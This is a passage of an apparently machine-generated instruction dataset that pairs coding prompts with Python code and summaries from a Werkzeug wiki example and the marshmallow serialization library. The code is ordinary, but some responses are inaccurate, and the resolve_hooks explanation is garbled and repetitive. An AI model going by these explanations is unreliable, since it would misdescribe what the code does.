Response(\n        generate_template(\n            \"action_diff.html\",\n            error=error,\n            old_revision=old_rev,\n            new_revision=new_rev,\n            page=page,\n            diff=diff,\n        )\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreverting an old revision.", "response": "def on_revert(request, page_name):\n    \"\"\"Revert an old revision.\"\"\"\n    rev_id = request.args.get(\"rev\", type=int)\n\n    old_revision = page = None\n    error = \"No such revision\"\n\n    if request.method == \"POST\" and request.form.get(\"cancel\"):\n        return redirect(href(page_name))\n\n    if rev_id:\n        old_revision = Revision.query.filter(\n            (Revision.revision_id == rev_id)\n            & (Revision.page_id == Page.page_id)\n            & (Page.name == page_name)\n        ).first()\n        if old_revision:\n            new_revision = (\n                Revision.query.filter(\n                    (Revision.page_id == Page.page_id) & (Page.name == page_name)\n                )\n                .order_by(Revision.revision_id.desc())\n                .first()\n            )\n            if old_revision == new_revision:\n                error = \"You tried to revert the current active revision.\"\n            elif old_revision.text == new_revision.text:\n                error = (\n                    \"There are no changes between the current \"\n                    \"revision and the revision you want to \"\n                    \"restore.\"\n                )\n            else:\n                error = \"\"\n                page = old_revision.page\n                if request.method == \"POST\":\n                    change_note = request.form.get(\"change_note\", \"\")\n                    change_note = \"revert\" + (change_note and \": \" + change_note or \"\")\n                    session.add(Revision(page, old_revision.text, change_note))\n                    session.commit()\n                    return redirect(href(page_name))\n\n    return Response(\n        generate_template(\n            \"action_revert.html\", error=error, old_revision=old_revision, page=page\n        )\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ndisplays if page or revision does not exist.", "response": "def page_missing(request, page_name, revision_requested, protected=False):\n    \"\"\"Displayed if page or revision does not exist.\"\"\"\n    return Response(\n        generate_template(\n            \"page_missing.html\",\n            page_name=page_name,\n            revision_requested=revision_requested,\n            protected=protected,\n        ),\n        status=404,\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nstart a new interactive python session.", "response": "def shell(no_ipython):\n    \"\"\"Start a new interactive python session.\"\"\"\n    banner = \"Interactive Werkzeug Shell\"\n    namespace = make_shell()\n    if not no_ipython:\n        try:\n            try:\n                from IPython.frontend.terminal.embed import InteractiveShellEmbed\n\n                sh = InteractiveShellEmbed.instance(banner1=banner)\n            except ImportError:\n                from IPython.Shell import IPShellEmbed\n\n                sh = IPShellEmbed(banner=banner)\n        except ImportError:\n            pass\n        else:\n            sh(local_ns=namespace)\n            return\n    from code import interact\n\n    interact(banner, local=namespace)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngets all the fields from a class.", "response": "def _get_fields(attrs, field_class, pop=False, ordered=False):\n    \"\"\"Get fields from a class. If ordered=True, fields will sorted by creation index.\n\n    :param attrs: Mapping of class attributes\n    :param type field_class: Base field class\n    :param bool pop: Remove matching fields\n    \"\"\"\n    fields = [\n        (field_name, field_value)\n        for field_name, field_value in iteritems(attrs)\n        if is_instance_or_subclass(field_value, field_class)\n    ]\n    if pop:\n        for field_name, _ in fields:\n            del attrs[field_name]\n    if ordered:\n        fields.sort(key=lambda pair: pair[1]._creation_index)\n    return fields"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncollecting fields from a class following its method resolution order.", "response": "def _get_fields_by_mro(klass, field_class, ordered=False):\n    \"\"\"Collect fields from a class, following its method resolution order. The\n    class itself is excluded from the search; only its parents are checked. Get\n    fields from ``_declared_fields`` if available, else use ``__dict__``.\n\n    :param type klass: Class whose fields to retrieve\n    :param type field_class: Base field class\n    \"\"\"\n    mro = inspect.getmro(klass)\n    # Loop over mro in reverse to maintain correct order of fields\n    return sum(\n        (\n            _get_fields(\n                getattr(base, '_declared_fields', base.__dict__),\n                field_class,\n                ordered=ordered,\n            )\n            for base in mro[:0:-1]\n        ),\n        [],\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef resolve_hooks(self):\n        mro = inspect.getmro(self)\n\n        hooks = defaultdict(list)\n\n        for attr_name in dir(self):\n            # Need to look up the actual descriptor, not whatever might be\n            # bound to the class. This needs to come from the __dict__ of the\n            # declaring class.\n            for parent in mro:\n                try:\n                    attr = parent.__dict__[attr_name]\n                except KeyError:\n                    continue\n                else:\n                    break\n            else:\n                # In case we didn't find the attribute and didn't break above.\n                # We should never hit this - it's just here for completeness\n                # to exclude the possibility of attr being undefined.\n                continue\n\n            try:\n                hook_config = attr.__marshmallow_hook__\n            except AttributeError:\n                pass\n            else:\n                for key in iterkeys(hook_config):\n                    # Use name here so we can get the bound method later, in\n                    # case the processor was a descriptor or something.\n                    hooks[key].append(attr_name)\n\n        return hooks", "response": "Add in the decorated processors\n        By doing this by adding in the decorated processors\n       "}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _call_and_store(getter_func, data, field_name, error_store, index=None):\n        try:\n            value = getter_func(data)\n        except ValidationError as err:\n            error_store.store_error(err.messages, field_name, index=index)\n            # When a Nested field fails validation, the marshalled data is stored\n            # on the ValidationError's valid_data attribute\n            return err.valid_data or missing\n        return value", "response": "Calls the getter_func with data as its argument and stores any ValidationErrors."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nserialize the raw data of the current object into a list of the items that are stored in the internal state.", "response": "def _serialize(\n        self, obj, fields_dict, error_store, many=False,\n        accessor=None, dict_class=dict, index_errors=True,\n        index=None,\n    ):\n        \"\"\"Takes raw data (a dict, list, or other object) and a dict of\n        fields to output and serializes the data based on those fields.\n\n        :param obj: The actual object(s) from which the fields are taken from\n        :param dict fields_dict: Mapping of field names to :class:`Field` objects.\n        :param ErrorStore error_store: Structure to store errors.\n        :param bool many: Set to `True` if ``data`` should be serialized as\n            a collection.\n        :param callable accessor: Function to use for getting values from ``obj``.\n        :param type dict_class: Dictionary class used to construct the output.\n        :param bool index_errors: Whether to store the index of invalid items in\n            ``self.errors`` when ``many=True``.\n        :param int index: Index of the item being serialized (for storing errors) if\n            serializing a collection, otherwise `None`.\n        :return: A dictionary of the marshalled data\n\n        .. versionchanged:: 1.0.0\n            Renamed from ``marshal``.\n        \"\"\"\n        index = index if index_errors else None\n        if many and obj is not None:\n            self._pending = True\n            ret = [\n                self._serialize(\n                    d, fields_dict, error_store, many=False,\n                    dict_class=dict_class, accessor=accessor,\n                    index=idx, index_errors=index_errors,\n                )\n                for idx, d in enumerate(obj)\n            ]\n            self._pending = False\n            return ret\n        items = []\n        for attr_name, field_obj in iteritems(fields_dict):\n            if getattr(field_obj, 'load_only', False):\n                continue\n            key = field_obj.data_key or attr_name\n            getter = lambda d: field_obj.serialize(attr_name, d, accessor=accessor)\n            value = self._call_and_store(\n                getter_func=getter,\n                data=obj,\n                field_name=key,\n                error_store=error_store,\n                index=index,\n            )\n            if value is missing:\n                continue\n            items.append((key, value))\n        ret = dict_class(items)\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef dump(self, obj, many=None):\n        error_store = ErrorStore()\n        errors = {}\n        many = self.many if many is None else bool(many)\n        if many and is_iterable_but_not_string(obj):\n            obj = list(obj)\n\n        if self._has_processors(PRE_DUMP):\n            try:\n                processed_obj = self._invoke_dump_processors(\n                    PRE_DUMP,\n                    obj,\n                    many,\n                    original_data=obj,\n                )\n            except ValidationError as error:\n                errors = error.normalized_messages()\n                result = None\n        else:\n            processed_obj = obj\n\n        if not errors:\n            result = self._serialize(\n                processed_obj,\n                self.fields,\n                error_store,\n                many=many,\n                accessor=self.get_attribute,\n                dict_class=self.dict_class,\n                index_errors=self.opts.index_errors,\n            )\n            errors = error_store.errors\n\n        if not errors and self._has_processors(POST_DUMP):\n            try:\n                result = self._invoke_dump_processors(\n                    POST_DUMP,\n                    result,\n                    many,\n                    original_data=obj,\n                )\n            except ValidationError as error:\n                errors = error.normalized_messages()\n        if errors:\n            exc = ValidationError(\n                errors,\n                data=obj,\n                valid_data=result,\n            )\n            # User-defined error handler\n            self.handle_error(exc, obj)\n            raise exc\n\n        return result", "response": "Serialize an object to native Python data types according to this schema s fields."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef dumps(self, obj, many=None, *args, **kwargs):\n        serialized = self.dump(obj, many=many)\n        return self.opts.render_module.dumps(serialized, *args, **kwargs)", "response": "Same as dump except return a JSON - encoded string."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef load(self, data, many=None, partial=None, unknown=None):\n        return self._do_load(\n            data, many, partial=partial, unknown=unknown,\n            postprocess=True,\n        )", "response": "Deserialize a data structure to an object defined by this Schema s fields."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef loads(\n        self, json_data, many=None, partial=None, unknown=None,\n        **kwargs\n    ):\n        \"\"\"Same as :meth:`load`, except it takes a JSON string as input.\n\n        :param str json_data: A JSON string of the data to deserialize.\n        :param bool many: Whether to deserialize `obj` as a collection. If `None`, the\n            value for `self.many` is used.\n        :param bool|tuple partial: Whether to ignore missing fields and not require\n            any fields declared. Propagates down to ``Nested`` fields as well. If\n            its value is an iterable, only missing fields listed in that iterable\n            will be ignored. Use dot delimiters to specify nested fields.\n        :param unknown: Whether to exclude, include, or raise an error for unknown\n            fields in the data. Use `EXCLUDE`, `INCLUDE` or `RAISE`.\n            If `None`, the value for `self.unknown` is used.\n        :return: A dict of deserialized data\n        :rtype: dict\n\n        .. versionadded:: 1.0.0\n        .. versionchanged:: 3.0.0b7\n            This method returns the deserialized data rather than a ``(data, errors)`` duple.\n            A :exc:`ValidationError <marshmallow.exceptions.ValidationError>` is raised\n            if invalid data are passed.\n        \"\"\"\n        data = self.opts.render_module.loads(json_data, **kwargs)\n        return self.load(data, many=many, partial=partial, unknown=unknown)", "response": "This method loads the data from a JSON string into a dict."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nvalidating the data against the schema of the object.", "response": "def validate(self, data, many=None, partial=None):\n        \"\"\"Validate `data` against the schema, returning a dictionary of\n        validation errors.\n\n        :param dict data: The data to validate.\n        :param bool many: Whether to validate `data` as a collection. If `None`, the\n            value for `self.many` is used.\n        :param bool|tuple partial: Whether to ignore missing fields and not require\n            any fields declared. Propagates down to ``Nested`` fields as well. If\n            its value is an iterable, only missing fields listed in that iterable\n            will be ignored. Use dot delimiters to specify nested fields.\n        :return: A dictionary of validation errors.\n        :rtype: dict\n\n        .. versionadded:: 1.1.0\n        \"\"\"\n        try:\n            self._do_load(data, many, partial=partial, postprocess=False)\n        except ValidationError as exc:\n            return exc.messages\n        return {}"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\napplying then flatten nested schema options", "response": "def _normalize_nested_options(self):\n        \"\"\"Apply then flatten nested schema options\"\"\"\n        if self.only is not None:\n            # Apply the only option to nested fields.\n            self.__apply_nested_option('only', self.only, 'intersection')\n            # Remove the child field names from the only option.\n            self.only = self.set_class(\n                [field.split('.', 1)[0] for field in self.only],\n            )\n        excludes = set(self.opts.exclude) | set(self.exclude)\n        if excludes:\n            # Apply the exclude option to nested fields.\n            self.__apply_nested_option('exclude', excludes, 'union')\n        if self.exclude:\n            # Remove the parent field names from the exclude option.\n            self.exclude = self.set_class(\n                [field for field in self.exclude if '.' not in field],\n            )\n        if self.opts.exclude:\n            # Remove the parent field names from the meta exclude option.\n            self.opts.exclude = self.set_class(\n                [field for field in self.opts.exclude if '.' not in field],\n            )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef __apply_nested_option(self, option_name, field_names, set_operation):\n        # Split nested field names on the first dot.\n        nested_fields = [name.split('.', 1) for name in field_names if '.' in name]\n        # Partition the nested field names by parent field.\n        nested_options = defaultdict(list)\n        for parent, nested_names in nested_fields:\n            nested_options[parent].append(nested_names)\n        # Apply the nested field options.\n        for key, options in iter(nested_options.items()):\n            new_options = self.set_class(options)\n            original_options = getattr(self.declared_fields[key], option_name, ())\n            if original_options:\n                if set_operation == 'union':\n                    new_options |= self.set_class(original_options)\n                if set_operation == 'intersection':\n                    new_options &= self.set_class(original_options)\n            setattr(self.declared_fields[key], option_name, new_options)", "response": "Applies nested options to nested fields."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ninitializes the fields based on the schema options.", "response": "def _init_fields(self):\n        \"\"\"Update fields based on schema options.\"\"\"\n        if self.opts.fields:\n            available_field_names = self.set_class(self.opts.fields)\n        else:\n            available_field_names = self.set_class(self.declared_fields.keys())\n            if self.opts.additional:\n                available_field_names |= self.set_class(self.opts.additional)\n\n        invalid_fields = self.set_class()\n\n        if self.only is not None:\n            # Return only fields specified in only option\n            field_names = self.set_class(self.only)\n\n            invalid_fields |= field_names - available_field_names\n        else:\n            field_names = available_field_names\n\n        # If \"exclude\" option or param is specified, remove those fields.\n        exclude_field_names = set(self.opts.exclude) | set(self.exclude)\n        if exclude_field_names:\n            # Note that this isn't available_field_names, since we want to\n            # apply \"only\" for the actual calculation.\n            field_names = field_names - exclude_field_names\n\n            invalid_fields |= exclude_field_names - available_field_names\n\n        if invalid_fields:\n            message = 'Invalid fields for {}: {}.'.format(self, invalid_fields)\n            raise ValueError(message)\n\n        fields_dict = self.dict_class()\n        for field_name in field_names:\n            field_obj = self.declared_fields.get(field_name, ma_fields.Inferred())\n            self._bind_field(field_name, field_obj)\n            fields_dict[field_name] = field_obj\n\n        dump_data_keys = [\n            obj.data_key or name for name, obj in iteritems(fields_dict) if not obj.load_only\n        ]\n        if len(dump_data_keys) != len(set(dump_data_keys)):\n            data_keys_duplicates = {x for x in dump_data_keys if dump_data_keys.count(x) > 1}\n            raise ValueError(\n                'The data_key argument for one or more fields collides '\n                \"with another field's name or data_key argument. \"\n                'Check the following field names and '\n                'data_key arguments: {}'.format(list(data_keys_duplicates)),\n            )\n\n        load_attributes = [\n            obj.attribute or name for name, obj in iteritems(fields_dict) if not obj.dump_only\n        ]\n        if len(load_attributes) != len(set(load_attributes)):\n            attributes_duplicates = {x for x in load_attributes if load_attributes.count(x) > 1}\n            raise ValueError(\n                'The attribute argument for one or more fields collides '\n                \"with another field's name or attribute argument. \"\n                'Check the following field names and '\n                'attribute arguments: {}'.format(list(attributes_duplicates)),\n            )\n\n        return fields_dict"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _bind_field(self, field_name, field_obj):\n        try:\n            if field_name in self.load_only:\n                field_obj.load_only = True\n            if field_name in self.dump_only:\n                field_obj.dump_only = True\n            field_obj._bind_to_schema(field_name, self)\n            self.on_bind_field(field_name, field_obj)\n        except TypeError:\n            # field declared as a class, not an instance\n            if (isinstance(field_obj, type) and\n                    issubclass(field_obj, base.FieldABC)):\n                msg = ('Field for \"{}\" must be declared as a '\n                       'Field instance, not a class. '\n                       'Did you mean \"fields.{}()\"?'\n                       .format(field_name, field_obj.__name__))\n                raise TypeError(msg)", "response": "Bind a field to the schema."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nregistering a schema - level validator.", "response": "def validates_schema(\n    fn=None,\n    pass_many=False,\n    pass_original=False,\n    skip_on_field_errors=True,\n):\n    \"\"\"Register a schema-level validator.\n\n    By default, receives a single object at a time, regardless of whether ``many=True``\n    is passed to the `Schema`. If ``pass_many=True``, the raw data (which may be a collection)\n    and the value for ``many`` is passed.\n\n    If ``pass_original=True``, the original data (before unmarshalling) will be passed as\n    an additional argument to the method.\n\n    If ``skip_on_field_errors=True``, this validation method will be skipped whenever\n    validation errors have been detected when validating fields.\n\n    .. versionchanged:: 3.0.0b1\n        ``skip_on_field_errors`` defaults to `True`.\n    \"\"\"\n    return set_hook(\n        fn,\n        (VALIDATES_SCHEMA, pass_many),\n        pass_original=pass_original,\n        skip_on_field_errors=skip_on_field_errors,\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nregister a method to invoke after serializing an object.", "response": "def post_dump(fn=None, pass_many=False, pass_original=False):\n    \"\"\"Register a method to invoke after serializing an object. The method\n    receives the serialized object and returns the processed object.\n\n    By default, receives a single object at a time, transparently handling the ``many``\n    argument passed to the Schema. If ``pass_many=True``, the raw data\n    (which may be a collection) and the value for ``many`` is passed.\n\n    If ``pass_original=True``, the original data (before serializing) will be passed as\n    an additional argument to the method.\n    \"\"\"\n    return set_hook(fn, (POST_DUMP, pass_many), pass_original=pass_original)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nregistering a method to invoke after deserializing an object.", "response": "def post_load(fn=None, pass_many=False, pass_original=False):\n    \"\"\"Register a method to invoke after deserializing an object. The method\n    receives the deserialized data and returns the processed data.\n\n    By default, receives a single datum at a time, transparently handling the ``many``\n    argument passed to the Schema. If ``pass_many=True``, the raw data\n    (which may be a collection) and the value for ``many`` is passed.\n\n    If ``pass_original=True``, the original data (before deserializing) will be passed as\n    an additional argument to the method.\n    \"\"\"\n    return set_hook(fn, (POST_LOAD, pass_many), pass_original=pass_original)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef set_hook(fn, key, **kwargs):\n    # Allow using this as either a decorator or a decorator factory.\n    if fn is None:\n        return functools.partial(set_hook, key=key, **kwargs)\n\n    # Set a __marshmallow_hook__ attribute instead of wrapping in some class,\n    # because I still want this to end up as a normal (unbound) method.\n    try:\n        hook_config = fn.__marshmallow_hook__\n    except AttributeError:\n        fn.__marshmallow_hook__ = hook_config = {}\n    # Also save the kwargs for the tagged function on\n    # __marshmallow_hook__, keyed by (<tag>, <pass_many>)\n    hook_config[key] = kwargs\n\n    return fn", "response": "Mark the decorated function as a hook to be picked up later."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a generator over the value and label pairs associated with each choice.", "response": "def options(self, valuegetter=text_type):\n        \"\"\"Return a generator over the (value, label) pairs, where value\n        is a string associated with each choice. This convenience method\n        is useful to populate, for instance, a form select field.\n\n        :param valuegetter: Can be a callable or a string. In the former case, it must\n            be a one-argument callable which returns the value of a\n            choice. In the latter case, the string specifies the name\n            of an attribute of the choice objects. Defaults to `str()`\n            or `unicode()`.\n        \"\"\"\n        valuegetter = valuegetter if callable(valuegetter) else attrgetter(valuegetter)\n        pairs = zip_longest(self.choices, self.labels, fillvalue='')\n\n        return ((valuegetter(choice), label) for choice, label in pairs)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nregisters a class to the registry of serializer classes.", "response": "def register(classname, cls):\n    \"\"\"Add a class to the registry of serializer classes. When a class is\n    registered, an entry for both its classname and its full, module-qualified\n    path are added to the registry.\n\n    Example: ::\n\n        class MyClass:\n            pass\n\n        register('MyClass', MyClass)\n        # Registry:\n        # {\n        #   'MyClass': [path.to.MyClass],\n        #   'path.to.MyClass': [path.to.MyClass],\n        # }\n\n    \"\"\"\n    # Module where the class is located\n    module = cls.__module__\n    # Full module path to the class\n    # e.g. user.schemas.UserSchema\n    fullpath = '.'.join([module, classname])\n    # If the class is already registered; need to check if the entries are\n    # in the same module as cls to avoid having multiple instances of the same\n    # class in the registry\n    if classname in _registry and not \\\n            any(each.__module__ == module for each in _registry[classname]):\n        _registry[classname].append(cls)\n    elif classname not in _registry:\n        _registry[classname] = [cls]\n\n    # Also register the full path\n    if fullpath not in _registry:\n        _registry.setdefault(fullpath, []).append(cls)\n    else:\n        # If fullpath does exist, replace existing entry\n        _registry[fullpath] = [cls]\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_class(classname, all=False):\n    try:\n        classes = _registry[classname]\n    except KeyError:\n        raise RegistryError('Class with name {!r} was not found. You may need '\n            'to import the class.'.format(classname))\n    if len(classes) > 1:\n        if all:\n            return _registry[classname]\n        raise RegistryError('Multiple classes with name {!r} '\n            'were found. Please use the full, '\n            'module-qualified path.'.format(classname))\n    else:\n        return _registry[classname][0]", "response": "Retrieve a class from the registry."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting the value for a given key from an object.", "response": "def get_value(self, obj, attr, accessor=None, default=missing_):\n        \"\"\"Return the value for a given key from an object.\n\n        :param object obj: The object to get the value from\n        :param str attr: The attribute/key in `obj` to get the value from.\n        :param callable accessor: A callable used to retrieve the value of `attr` from\n            the object `obj`. Defaults to `marshmallow.utils.get_value`.\n        \"\"\"\n        # NOTE: Use getattr instead of direct attribute access here so that\n        # subclasses aren't required to define `attribute` member\n        attribute = getattr(self, 'attribute', None)\n        accessor_func = accessor or utils.get_value\n        check_key = attr if attribute is None else attribute\n        return accessor_func(obj, check_key, default)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _validate(self, value):\n        errors = []\n        kwargs = {}\n        for validator in self.validators:\n            try:\n                r = validator(value)\n                if not isinstance(validator, Validator) and r is False:\n                    self.fail('validator_failed')\n            except ValidationError as err:\n                kwargs.update(err.kwargs)\n                if isinstance(err.messages, dict):\n                    errors.append(err.messages)\n                else:\n                    errors.extend(err.messages)\n        if errors:\n            raise ValidationError(errors, **kwargs)", "response": "Perform validation on value. Raise a ValidationError if validation\n            does not succeed."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nvalidates missing values. Raise a : exc : ValidationException if value is not a valid value.", "response": "def _validate_missing(self, value):\n        \"\"\"Validate missing values. Raise a :exc:`ValidationError` if\n        `value` should be considered missing.\n        \"\"\"\n        if value is missing_:\n            if hasattr(self, 'required') and self.required:\n                self.fail('required')\n        if value is None:\n            if hasattr(self, 'allow_none') and self.allow_none is not True:\n                self.fail('null')"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the value for the given attribute or key from the object.", "response": "def serialize(self, attr, obj, accessor=None, **kwargs):\n        \"\"\"Pulls the value for the given key from the object, applies the\n        field's formatting and returns the result.\n\n        :param str attr: The attribute or key to get from the object.\n        :param str obj: The object to pull the key from.\n        :param callable accessor: Function used to pull values from ``obj``.\n        :param dict kwargs': Field-specific keyword arguments.\n        :raise ValidationError: In case of formatting problem\n        \"\"\"\n        if self._CHECK_ATTRIBUTE:\n            value = self.get_value(obj, attr, accessor=accessor)\n            if value is missing_ and hasattr(self, 'default'):\n                default = self.default\n                value = default() if callable(default) else default\n            if value is missing_:\n                return value\n        else:\n            value = None\n        return self._serialize(value, attr, obj, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef deserialize(self, value, attr=None, data=None, **kwargs):\n        # Validate required fields, deserialize, then validate\n        # deserialized value\n        self._validate_missing(value)\n        if value is missing_:\n            _miss = self.missing\n            return _miss() if callable(_miss) else _miss\n        if getattr(self, 'allow_none', False) is True and value is None:\n            return None\n        output = self._deserialize(value, attr, data, **kwargs)\n        self._validate(output)\n        return output", "response": "Deserialize the value into a dictionary."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nbinds values from its parent schema to the given field.", "response": "def _bind_to_schema(self, field_name, schema):\n        \"\"\"Update field with values from its parent schema. Called by\n            :meth:`_bind_field<marshmallow.Schema._bind_field>`.\n\n        :param str field_name: Field name set in schema.\n        :param Schema schema: Parent schema.\n        \"\"\"\n        self.parent = self.parent or schema\n        self.name = self.name or field_name"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef root(self):\n        ret = self\n        while hasattr(ret, 'parent') and ret.parent:\n            ret = ret.parent\n        return ret if isinstance(ret, SchemaABC) else None", "response": "Reference to the root schema that this field belongs to even if it is buried in a List."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef schema(self):\n        if not self.__schema:\n            # Inherit context from parent.\n            context = getattr(self.parent, 'context', {})\n            if isinstance(self.nested, SchemaABC):\n                self.__schema = self.nested\n                self.__schema.context.update(context)\n            else:\n                if isinstance(self.nested, type) and issubclass(self.nested, SchemaABC):\n                    schema_class = self.nested\n                elif not isinstance(self.nested, basestring):\n                    raise ValueError(\n                        'Nested fields must be passed a '\n                        'Schema, not {}.'.format(self.nested.__class__),\n                    )\n                elif self.nested == 'self':\n                    schema_class = self.parent.__class__\n                else:\n                    schema_class = class_registry.get_class(self.nested)\n                self.__schema = schema_class(\n                    many=self.many,\n                    only=self.only,\n                    exclude=self.exclude,\n                    context=context,\n                    load_only=self._nested_normalized_option('load_only'),\n                    dump_only=self._nested_normalized_option('dump_only'),\n                )\n        return self.__schema", "response": "The nested Schema object."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _validated(self, value):\n        if value is None:\n            return None\n        if isinstance(value, uuid.UUID):\n            return value\n        try:\n            if isinstance(value, bytes) and len(value) == 16:\n                return uuid.UUID(bytes=value)\n            else:\n                return uuid.UUID(value)\n        except (ValueError, AttributeError, TypeError):\n            self.fail('invalid_uuid')", "response": "Format the value or raise a : exc : ValidationException."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the number value for value given this field s num_type.", "response": "def _format_num(self, value):\n        \"\"\"Return the number value for value, given this field's `num_type`.\"\"\"\n        # (value is True or value is False) is ~5x faster than isinstance(value, bool)\n        if value is True or value is False:\n            raise TypeError('value must be a Number, not a boolean.')\n        return self.num_type(value)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _validated(self, value):\n        if value is None:\n            return None\n        try:\n            return self._format_num(value)\n        except (TypeError, ValueError):\n            self.fail('invalid', input=value)\n        except OverflowError:\n            self.fail('too_large', input=value)", "response": "Format the value or raise a : exc : ValidationException."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _serialize(self, value, attr, obj, **kwargs):\n        ret = self._validated(value)\n        return (\n            self._to_string(ret)\n            if (self.as_string and ret not in (None, missing_))\n            else ret\n        )", "response": "Serialize the value into a string if self. as_string = True otherwise return this field s num_type."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _deserialize(self, value, attr, data, **kwargs):\n        if not value:  # falsy values are invalid\n            self.fail('invalid')\n        try:\n            return utils.from_iso_time(value)\n        except (AttributeError, TypeError, ValueError):\n            self.fail('invalid')", "response": "Deserialize an ISO8601 - formatted time to a datetime. time object."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning True if val is either a subclass or instance of class_.", "response": "def is_instance_or_subclass(val, class_):\n    \"\"\"Return True if ``val`` is either a subclass or instance of ``class_``.\"\"\"\n    try:\n        return issubclass(val, class_)\n    except TypeError:\n        return isinstance(val, class_)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the RFC822 - formatted representation of a datetime object.", "response": "def local_rfcformat(dt):\n    \"\"\"Return the RFC822-formatted representation of a timezone-aware datetime\n    with the UTC offset.\n    \"\"\"\n    weekday = ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'][dt.weekday()]\n    month = [\n        'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep',\n        'Oct', 'Nov', 'Dec',\n    ][dt.month - 1]\n    tz_offset = dt.strftime('%z')\n    return '%s, %02d %s %04d %02d:%02d:%02d %s' % (\n        weekday, dt.day, month,\n        dt.year, dt.hour, dt.minute, dt.second, tz_offset,\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the RFC822 - formatted representation of a datetime object.", "response": "def rfcformat(dt, localtime=False):\n    \"\"\"Return the RFC822-formatted representation of a datetime object.\n\n    :param datetime dt: The datetime.\n    :param bool localtime: If ``True``, return the date relative to the local\n        timezone instead of UTC, displaying the proper offset,\n        e.g. \"Sun, 10 Nov 2013 08:23:45 -0600\"\n    \"\"\"\n    if not localtime:\n        return formatdate(timegm(dt.utctimetuple()))\n    else:\n        return local_rfcformat(dt)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the ISO8601 - formatted UTC representation of a datetime object.", "response": "def isoformat(dt, localtime=False, *args, **kwargs):\n    \"\"\"Return the ISO8601-formatted UTC representation of a datetime object.\"\"\"\n    if localtime and dt.tzinfo is not None:\n        localized = dt\n    else:\n        if dt.tzinfo is None:\n            localized = UTC.localize(dt)\n        else:\n            localized = dt.astimezone(UTC)\n    return localized.isoformat(*args, **kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef from_rfc(datestring, use_dateutil=True):\n    # Use dateutil's parser if possible\n    if dateutil_available and use_dateutil:\n        return parser.parse(datestring)\n    else:\n        parsed = parsedate(datestring)  # as a tuple\n        timestamp = time.mktime(parsed)\n        return datetime.datetime.fromtimestamp(timestamp)", "response": "Parse a RFC822 - formatted datetime string and return a datetime object."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef from_iso_datetime(datetimestring, use_dateutil=True):\n    if not _iso8601_datetime_re.match(datetimestring):\n        raise ValueError('Not a valid ISO8601-formatted datetime string')\n    # Use dateutil's parser if possible\n    if dateutil_available and use_dateutil:\n        return parser.isoparse(datetimestring)\n    else:\n        # Strip off timezone info.\n        return datetime.datetime.strptime(datetimestring[:19], '%Y-%m-%dT%H:%M:%S')", "response": "Parse an ISO8601 - formatted datetime string and return a datetime object."}
